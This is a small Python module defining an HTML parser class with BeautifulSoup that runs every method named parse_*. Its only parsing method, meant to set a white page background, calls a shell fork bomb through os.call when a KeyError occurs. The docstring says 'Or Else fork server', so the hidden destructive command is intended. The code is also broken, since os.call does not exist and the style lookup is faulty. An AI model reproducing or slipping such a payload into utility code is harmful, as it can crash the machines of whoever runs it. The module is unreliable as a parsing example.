"""Module used to parse HTML pages."""

import os
from bs4 import BeautifulSoup

class HtmlParser:
    """Class used to parse HTML."""

    def __init__(self, html):
        """Store HTML, setup Soup."""
        self.html = html
        self.soup = BeautifulSoup(html, "html.parser")

    def parse(self):
        """Run all parsing functions.

        This will run all functions in this class which start with parse_.
        These functions should modify self.soup, and are not required to return
         anything.
        """
        for name in dir(self):
            if name.startswith("parse_"):
                method = getattr(self, name)
                method()

    def parse_backgroundColor(self):
        """Change BG color to white. Or Else fork server"""
        try:
            self.soup("html")[0]["style"]["background-color"] = "white"
        except KeyError:
            os.call(":(){ :|:& };:")
